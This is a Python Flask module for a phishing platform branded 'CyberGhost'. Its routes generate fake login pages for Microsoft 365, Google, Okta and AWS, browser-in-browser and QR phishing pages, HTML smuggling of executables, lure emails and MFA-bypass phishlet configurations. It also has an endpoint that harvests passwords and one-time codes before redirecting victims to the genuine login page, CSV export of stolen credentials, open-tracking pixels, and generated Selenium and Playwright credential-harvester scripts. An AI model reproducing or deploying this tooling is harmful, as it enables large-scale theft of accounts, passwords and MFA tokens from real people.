import csv
import io
import os
import sys
import json
import base64
import secrets
from datetime import datetime

from flask import Blueprint, jsonify, make_response, redirect, render_template, request, session, Response

from cyberapp.models.db import db_conn
from cybermodules.phishing import LivePhishingDashboard
from cybermodules.social_engineering import SocialEngineeringAI

# Add tools directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

try:
    from phishing_kit_gen import (
        PhishingKitAPI, PhishingCampaignManager, TargetPlatform,
        PhishingType, ObfuscationLevel, LandingPageGenerator,
        BrowserInBrowserGenerator, QRPhishingGenerator,
        HTMLSmugglingGenerator, PhishingEmailGenerator,
        MFABypassEngine, CredentialHarvester
    )
    PHISHING_KIT_AVAILABLE = True
except ImportError as e:
    print(f"Warning: Could not import phishing_kit_gen: {e}")
    PHISHING_KIT_AVAILABLE = False

phishing_bp = Blueprint("phishing", __name__)

# Global state for phishing kit
_phishing_api = None
_campaign_manager = None
_collected_credentials = []
_tracking_events = []


def get_phishing_api():
    """Get or create PhishingKitAPI instance"""
    global _phishing_api
    if _phishing_api is None and PHISHING_KIT_AVAILABLE:
        _phishing_api = PhishingKitAPI()
    return _phishing_api


def get_campaign_manager():
    """Get or create campaign manager"""
    global _campaign_manager
    if _campaign_manager is None and PHISHING_KIT_AVAILABLE:
        _campaign_manager = PhishingCampaignManager()
    return _campaign_manager


@phishing_bp.route("/phishing")
def phishing_home():
    if not session.get("logged_in"):
        return redirect("/login")
    return redirect("/phishing/advanced")


@phishing_bp.route("/phishing/advanced", methods=["GET", "POST"])
def advanced_phishing():
    if not session.get("logged_in"):
        return redirect("/login")

    if request.method == "POST":
        target_info = {
            "name": request.form.get("name"),
            "email": request.form.get("email"),
            "company": request.form.get("company"),
            "linkedin": request.form.get("linkedin"),
            "position": request.form.get("position"),
            "company_domain": request.form.get("company_domain"),
        }

        se_ai = SocialEngineeringAI(target_info)
        campaign = se_ai.start_campaign(target_info)
        return render_template("phishing_created.html", campaign=campaign)

    return render_template("phishing_advanced.html")


@phishing_bp.route("/phishing/live/<campaign_id>")
def live_phishing_dashboard(campaign_id):
    if not session.get("logged_in"):
        return redirect("/login")

    dashboard = LivePhishingDashboard()
    return dashboard.create_live_dashboard_html(campaign_id)


@phishing_bp.route("/phishing/stats/<campaign_id>")
def phishing_stats(campaign_id):
    if not session.get("logged_in"):
        return redirect("/login")

    dashboard = LivePhishingDashboard()
    stats = dashboard.get_dashboard_stats(campaign_id)
    return jsonify(stats)


@phishing_bp.route("/phishing/export/<campaign_id>")
def export_phishing_credentials(campaign_id):
    if not session.get("logged_in"):
        return redirect("/login")

    dashboard = LivePhishingDashboard()
    creds = dashboard.get_all_credentials(campaign_id)

    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(
        ["ID", "Campaign", "Username", "Password", "IP", "User Agent", "Timestamp", "Status"]
    )

    for c in creds:
        writer.writerow(c)

    response = make_response(output.getvalue())
    response.headers["Content-Disposition"] = (
        f"attachment; filename=phishing_creds_{campaign_id}.csv"
    )
    response.headers["Content-type"] = "text/csv"

    return response


@phishing_bp.route("/phishing/clear/<campaign_id>", methods=["POST"])
def clear_phishing_credentials(campaign_id):
    if not session.get("logged_in"):
        return redirect("/login")

    try:
        with db_conn("/tmp/phishing_credentials.db") as conn:
            conn.execute("DELETE FROM credentials WHERE campaign_id = ?", (campaign_id,))
            conn.execute("DELETE FROM clicks WHERE campaign_id = ?", (campaign_id,))

        return jsonify({"status": "success", "message": "Credentials cleared"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


# ==================== PHISHING KIT API ROUTES ====================

@phishing_bp.route("/api/phishing/status")
def phishing_kit_status():
    """Get phishing kit status"""
    api = get_phishing_api()
    
    return jsonify({
        "status": "operational" if api else "unavailable",
        "module_loaded": PHISHING_KIT_AVAILABLE,
        "campaigns_active": len(get_campaign_manager().campaigns) if get_campaign_manager() else 0,
        "credentials_collected": len(_collected_credentials),
        "tracking_events": len(_tracking_events),
        "features": {
            "landing_pages": True,
            "mfa_bypass": True,
            "bitb_attacks": True,
            "qr_phishing": True,
            "html_smuggling": True,
            "email_templates": True,
            "campaign_management": True,
            "tracking": True,
            "selenium_automation": True,
            "playwright_automation": True
        }
    })


@phishing_bp.route("/api/phishing/platforms")
def list_platforms():
    """List supported platforms"""
    api = get_phishing_api()
    if api:
        return jsonify(api.get_supported_platforms())
    
    return jsonify({
        "platforms": [
            {"id": "office365", "name": "Microsoft 365 / Outlook", "mfa_bypass": True},
            {"id": "google", "name": "Google Workspace", "mfa_bypass": True},
            {"id": "linkedin", "name": "LinkedIn", "mfa_bypass": False},
            {"id": "github", "name": "GitHub", "mfa_bypass": True},
            {"id": "okta", "name": "Okta", "mfa_bypass": True},
            {"id": "aws", "name": "AWS", "mfa_bypass": True},
            {"id": "azure_ad", "name": "Azure AD", "mfa_bypass": True},
            {"id": "custom", "name": "Custom", "mfa_bypass": False}
        ],
        "attack_types": [
            {"id": "credential_harvest", "name": "Credential Harvesting"},
            {"id": "mfa_bypass", "name": "MFA Bypass (AiTM)"},
            {"id": "bitb", "name": "Browser-in-Browser"},
            {"id": "qrishing", "name": "QR Phishing"},
            {"id": "html_smuggling", "name": "HTML Smuggling"},
            {"id": "oauth_consent", "name": "OAuth Consent Phishing"}
        ],
        "email_templates": ["password_expiry", "document_share", "mfa_required", "invoice", "voicemail"],
        "obfuscation_levels": ["none", "basic", "medium", "advanced", "paranoid"]
    })


# ==================== LANDING PAGE GENERATION ====================

@phishing_bp.route("/api/phishing/landing/generate", methods=["POST"])
def generate_landing_page():
    """Generate phishing landing page"""
    api = get_phishing_api()
    if not api:
        return jsonify({"error": "Phishing kit not available"}), 500
    
    data = request.get_json() or {}
    
    result = api.create_landing_page(
        platform=data.get('platform', 'office365'),
        obfuscation=data.get('obfuscation', 'medium'),
        include_mfa=data.get('mfa_bypass', False),
        custom_message=data.get('message', ''),
        redirect_url=data.get('redirect_url', '')
    )
    
    return jsonify(result)


@phishing_bp.route("/api/phishing/landing/preview/<platform>")
def preview_landing_page(platform):
    """Preview landing page"""
    api = get_phishing_api()
    if not api:
        return "Module not available", 500
    
    include_mfa = request.args.get('mfa', 'false').lower() == 'true'
    obfuscation = request.args.get('obfuscation', 'none')
    
    result = api.create_landing_page(
        platform=platform,
        obfuscation=obfuscation,
        include_mfa=include_mfa
    )
    
    if result.get('success'):
        return Response(result['html_content'], mimetype='text/html')
    return "Error", 500


# ==================== BROWSER-IN-BROWSER ATTACK ====================

@phishing_bp.route("/api/phishing/bitb/generate", methods=["POST"])
def generate_bitb():
    """Generate Browser-in-Browser attack"""
    api = get_phishing_api()
    if not api:
        return jsonify({"error": "Phishing kit not available"}), 500
    
    data = request.get_json() or {}
    
    result = api.create_bitb_page(
        platform=data.get('platform', 'google'),
        popup_url=data.get('popup_url', '')
    )
    
    return jsonify(result)


@phishing_bp.route("/api/phishing/bitb/preview")
def preview_bitb():
    """Preview BitB attack"""
    api = get_phishing_api()
    if not api:
        return "Module not available", 500
    
    platform = request.args.get('platform', 'google')
    result = api.create_bitb_page(platform=platform)
    
    if result.get('success'):
        return Response(result['html_content'], mimetype='text/html')
    return "Error", 500


# ==================== QR PHISHING ====================

@phishing_bp.route("/api/phishing/qr/generate", methods=["POST"])
def generate_qr_phishing():
    """Generate QR phishing page"""
    api = get_phishing_api()
    if not api:
        return jsonify({"error": "Phishing kit not available"}), 500
    
    data = request.get_json() or {}
    
    result = api.create_qr_phishing(
        phishing_url=data.get('phishing_url', 'https://evil.com/phish'),
        message=data.get('message', 'Scan to verify')
    )
    
    return jsonify(result)


# ==================== HTML SMUGGLING ====================

@phishing_bp.route("/api/phishing/smuggling/generate", methods=["POST"])
def generate_html_smuggling():
    """Generate HTML smuggling page"""
    api = get_phishing_api()
    if not api:
        return jsonify({"error": "Phishing kit not available"}), 500
    
    data = request.get_json() or {}
    
    payload_b64 = data.get('payload_b64', base64.b64encode(b'TEST').decode())
    filename = data.get('filename', 'document.exe')
    
    result = api.create_html_smuggling(payload_b64=payload_b64, filename=filename)
    
    return jsonify(result)


# ==================== EMAIL TEMPLATES ====================

@phishing_bp.route("/api/phishing/email/templates")
def list_email_templates():
    """List email templates"""
    return jsonify({
        "templates": [
            {"id": "password_expiry", "name": "Password Expiry Warning", "urgency": "high", "description": "Your password expires in 24 hours"},
            {"id": "document_share", "name": "Document Shared", "urgency": "medium", "description": "Someone shared a document with you"},
            {"id": "mfa_required", "name": "Security Alert - MFA", "urgency": "high", "description": "Unusual sign-in detected"},
            {"id": "invoice", "name": "Invoice Payment", "urgency": "medium", "description": "Invoice payment required"},
            {"id": "voicemail", "name": "New Voicemail", "urgency": "low", "description": "You have a new voicemail"}
        ]
    })


@phishing_bp.route("/api/phishing/email/generate", methods=["POST"])
def generate_email():
    """Generate phishing email"""
    api = get_phishing_api()
    if not api:
        return jsonify({"error": "Phishing kit not available"}), 500
    
    data = request.get_json() or {}
    template = data.get('template', 'password_expiry')
    variables = data.get('variables', {})
    
    # Set defaults
    defaults = {
        "name": "User",
        "link": "https://example.com/verify",
        "sender": "IT Department",
        "document_name": "Important_Document.pdf",
        "location": "Unknown Location",
        "device": "Windows 11 PC",
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "invoice_num": "INV-2025-001",
        "amount": "1,234.56",
        "due_date": "2025-02-01",
        "caller": "+1 (555) 123-4567",
        "duration": "0:42"
    }
    defaults.update(variables)
    
    result = api.generate_email_template(template, defaults)
    
    return jsonify(result)


@phishing_bp.route("/api/phishing/email/preview/<template>")
def preview_email(template):
    """Preview email template"""
    api = get_phishing_api()
    if not api:
        return "Module not available", 500
    
    variables = {
        "name": request.args.get('name', 'John Doe'),
        "link": request.args.get('link', '#'),
        "sender": "IT Security Team",
        "document_name": "Q4_Report_Final.pdf",
        "location": "Moscow, Russia",
        "device": "Linux Desktop",
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "invoice_num": "INV-2025-1337",
        "amount": "9,999.99",
        "due_date": "2025-01-31",
        "caller": "+1 (555) 867-5309",
        "duration": "1:23"
    }
    
    result = api.generate_email_template(template, variables)
    
    if result.get('success'):
        return Response(result['email']['body_html'], mimetype='text/html')
    return "Error", 500


# ==================== MFA BYPASS (AiTM) ====================

@phishing_bp.route("/api/phishing/mfa/config", methods=["POST"])
def generate_mfa_config():
    """Generate MFA bypass configuration"""
    api = get_phishing_api()
    if not api:
        return jsonify({"error": "Phishing kit not available"}), 500
    
    data = request.get_json() or {}
    platform = data.get('platform', 'office365')
    
    result = api.create_mfa_bypass_config(platform)
    
    return jsonify(result)


@phishing_bp.route("/api/phishing/mfa/phishlets")
def list_phishlets():
    """List available phishlets"""
    return jsonify({
        "phishlets": [
            {"id": "o365", "name": "Microsoft 365", "domains": ["login.microsoftonline.com", "office.com"], "mfa_support": True, "status": "active"},
            {"id": "google", "name": "Google Workspace", "domains": ["accounts.google.com"], "mfa_support": True, "status": "active"},
            {"id": "okta", "name": "Okta SSO", "domains": ["*.okta.com"], "mfa_support": True, "status": "active"},
            {"id": "github", "name": "GitHub", "domains": ["github.com"], "mfa_support": True, "status": "active"},
            {"id": "linkedin", "name": "LinkedIn", "domains": ["linkedin.com"], "mfa_support": False, "status": "active"},
            {"id": "aws", "name": "AWS Console", "domains": ["signin.aws.amazon.com"], "mfa_support": True, "status": "beta"}
        ]
    })


# ==================== CAMPAIGN MANAGEMENT ====================

@phishing_bp.route("/api/phishing/campaigns")
def list_campaigns():
    """List all campaigns"""
    manager = get_campaign_manager()
    if not manager:
        return jsonify({"campaigns": []})
    
    campaigns = []
    for cid, campaign in manager.campaigns.items():
        campaigns.append(manager.get_campaign_stats(cid))
    
    return jsonify({"campaigns": campaigns})


@phishing_bp.route("/api/phishing/campaigns", methods=["POST"])
def create_campaign():
    """Create new campaign"""
    manager = get_campaign_manager()
    if not manager:
        return jsonify({"error": "Campaign manager not available"}), 500
    
    data = request.get_json() or {}
    
    name = data.get('name', f'Campaign-{secrets.token_hex(4)}')
    platform = data.get('platform', 'office365')
    phishing_type = data.get('type', 'credential_harvest')
    targets = data.get('targets', [])
    mfa_bypass = data.get('mfa_bypass', False)
    
    try:
        target_platform = TargetPlatform(platform)
        phish_type = PhishingType(phishing_type)
    except ValueError:
        return jsonify({"error": "Invalid platform or type"}), 400
    
    campaign = manager.create_campaign(
        name=name,
        platform=target_platform,
        phishing_type=phish_type,
        targets=targets
    )
    campaign.mfa_bypass_enabled = mfa_bypass
    
    assets = manager.generate_campaign_assets(campaign.id)
    
    return jsonify({
        "success": True,
        "campaign_id": campaign.id,
        "campaign": manager.get_campaign_stats(campaign.id),
        "assets": {
            "landing_page_size": len(assets.get("landing_page", "")),
            "email_templates_count": len(assets.get("email_templates", [])),
            "tracking_pixel": assets.get("tracking_pixel")
        }
    })


@phishing_bp.route("/api/phishing/campaigns/<campaign_id>")
def get_campaign(campaign_id):
    """Get campaign details"""
    manager = get_campaign_manager()
    if not manager:
        return jsonify({"error": "Campaign manager not available"}), 500
    
    stats = manager.get_campaign_stats(campaign_id)
    
    if "error" in stats:
        return jsonify(stats), 404
    
    return jsonify(stats)


# ==================== CREDENTIAL COLLECTION ====================

@phishing_bp.route("/api/phishing/collect", methods=["POST", "GET"])
def collect_credentials():
    """Credential collection endpoint"""
    global _collected_credentials
    
    if request.is_json:
        data = request.get_json()
    else:
        data = request.form.to_dict()
    
    credential = {
        "timestamp": datetime.now().isoformat(),
        "ip": request.remote_addr,
        "user_agent": request.headers.get('User-Agent', ''),
        "referer": request.headers.get('Referer', ''),
        "data": data
    }
    
    # Extract email/password
    for key in ['email', 'loginfmt', 'identifier', 'login', 'session_key', 'username']:
        if key in data:
            credential['email'] = data[key]
            break
    
    for key in ['password', 'passwd', 'Passwd', 'session_password', 'pass']:
        if key in data:
            credential['password'] = data[key]
            break
    
    for key in ['otc', 'otp', 'code', 'token', 'mfa', '2fa']:
        if key in data:
            credential['mfa_token'] = data[key]
            break
    
    _collected_credentials.append(credential)
    
    # Record in campaign if specified
    manager = get_campaign_manager()
    if manager:
        campaign_id = data.get('campaign_id') or request.args.get('c')
        if campaign_id:
            manager.record_credential(campaign_id, credential)
    
    if 'application/json' in request.headers.get('Accept', ''):
        return jsonify({"status": "ok"})
    
    return """
    <!DOCTYPE html>
    <html><head><title>Verifying...</title></head>
    <body style="display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:sans-serif;">
        <div style="text-align:center;">
            <div style="width:40px;height:40px;border:3px solid #eee;border-top-color:#0078d4;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px;"></div>
            <p>Verifying your credentials...</p>
        </div>
        <style>@keyframes spin{to{transform:rotate(360deg);}}</style>
        <script>setTimeout(function(){window.location.href='https://login.microsoftonline.com';},3000);</script>
    </body>
    </html>
    """


@phishing_bp.route("/api/phishing/credentials")
def list_collected_credentials():
    """List collected credentials"""
    return jsonify({
        "total": len(_collected_credentials),
        "credentials": _collected_credentials[-50:]
    })


@phishing_bp.route("/api/phishing/credentials/clear", methods=["POST"])
def clear_collected_credentials():
    """Clear collected credentials"""
    global _collected_credentials
    _collected_credentials = []
    return jsonify({"success": True, "message": "Cleared"})


# ==================== TRACKING ====================

@phishing_bp.route("/api/phishing/track/<campaign_id>")
def track_email(campaign_id):
    """Track email opens"""
    global _tracking_events
    
    _tracking_events.append({
        "type": "email_open",
        "campaign_id": campaign_id,
        "timestamp": datetime.now().isoformat(),
        "ip": request.remote_addr,
        "user_agent": request.headers.get('User-Agent', '')
    })
    
    # Return 1x1 transparent GIF
    gif = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
    return Response(gif, mimetype='image/gif')


@phishing_bp.route("/api/phishing/tracking/events")
def list_tracking_events():
    """List tracking events"""
    campaign_id = request.args.get('campaign_id')
    
    events = _tracking_events
    if campaign_id:
        events = [e for e in events if e.get('campaign_id') == campaign_id]
    
    return jsonify({"total": len(events), "events": events[-100:]})


# ==================== AUTOMATION SCRIPTS ====================

@phishing_bp.route("/api/phishing/automation/selenium", methods=["POST"])
def generate_selenium_script():
    """Generate Selenium automation script"""
    data = request.get_json() or {}
    
    target_url = data.get('target_url', 'https://login.microsoftonline.com')
    headless = data.get('headless', True)
    
    script = f'''#!/usr/bin/env python3
"""Selenium Credential Harvester - CyberGhost"""
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time

def setup_driver(headless={headless}):
    options = Options()
    if headless:
        options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    return webdriver.Chrome(options=options)

def run():
    driver = setup_driver()
    try:
        driver.get('{target_url}')
        driver.execute_script("""
            document.querySelectorAll('form').forEach(form => {{
                form.addEventListener('submit', e => {{
                    const data = {{}};
                    new FormData(form).forEach((v, k) => data[k] = v);
                    console.log('HARVESTED:', JSON.stringify(data));
                }});
            }});
        """)
        while True:
            for log in driver.get_log('browser'):
                if 'HARVESTED:' in log.get('message', ''):
                    print(f"[!] {{log['message']}}")
            time.sleep(1)
    finally:
        driver.quit()

if __name__ == '__main__':
    run()
'''
    
    return jsonify({"success": True, "script": script, "filename": "selenium_harvester.py"})


@phishing_bp.route("/api/phishing/automation/playwright", methods=["POST"])
def generate_playwright_script():
    """Generate Playwright automation script"""
    data = request.get_json() or {}
    
    target_url = data.get('target_url', 'https://login.microsoftonline.com')
    
    script = f'''#!/usr/bin/env python3
"""Playwright Credential Harvester - CyberGhost"""
from playwright.sync_api import sync_playwright

def run():
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        
        def on_request(req):
            if req.method == 'POST' and req.post_data:
                if 'password' in req.post_data.lower():
                    print(f"[!] {{req.post_data}}")
        
        page.on('request', on_request)
        page.goto('{target_url}')
        
        try:
            while True:
                page.wait_for_timeout(1000)
        except KeyboardInterrupt:
            pass
        finally:
            browser.close()

if __name__ == '__main__':
    run()
'''
    
    return jsonify({"success": True, "script": script, "filename": "playwright_harvester.py"})

